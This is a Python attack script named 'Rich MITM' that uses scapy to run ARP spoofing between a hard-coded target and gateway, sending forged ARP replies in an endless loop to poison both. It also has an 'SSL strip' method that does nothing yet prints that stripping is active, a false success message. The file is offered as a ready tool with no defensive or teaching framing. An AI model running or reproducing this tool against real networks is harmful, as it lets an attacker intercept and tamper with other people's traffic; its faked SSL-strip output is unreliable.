#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Rich MITM - Man in the Middle"""

from rich.console import Console
from rich.panel import Panel
import scapy.all as scapy
import time

console = Console()

class MITMAttack:
    def __init__(self):
        self.target_ip = None
        self.gateway_ip = None
        
    def arp_spoof(self, target, gateway):
        """ARP spoofing attack"""
        console.print(Panel.fit(
            f"[bold red]MITM Attack: {target} <-> {gateway}[/bold red]",
            border_style="red"
        ))
        
        def get_mac(ip):
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            answered = scapy.srp(broadcast / arp_request, timeout=1, verbose=False)[0]
            return answered[0][1].hwsrc if answered else None
        
        target_mac = get_mac(target)
        gateway_mac = get_mac(gateway)
        
        console.print(f"[green]✓ Target MAC: {target_mac}[/green]")
        console.print(f"[green]✓ Gateway MAC: {gateway_mac}[/green]")
        console.print("[yellow]Starting ARP poisoning...[/yellow]")
        
        while True:
            try:
                scapy.send(scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=gateway), verbose=False)
                scapy.send(scapy.ARP(op=2, pdst=gateway, hwdst=gateway_mac, psrc=target), verbose=False)
                time.sleep(2)
            except KeyboardInterrupt:
                console.print("\n[yellow]Stopping attack...[/yellow]")
                break
    
    def ssl_strip(self):
        """SSL stripping attack"""
        console.print("[bold cyan]SSL Strip Attack[/bold cyan]")
        console.print("[yellow]Downgrading HTTPS to HTTP...[/yellow]")
        
        # SSL stripping code would go here
        console.print("[green]✓ SSL strip active[/green]")

if __name__ == "__main__":
    mitm = MITMAttack()
    mitm.arp_spoof("192.168.1.100", "192.168.1.1")

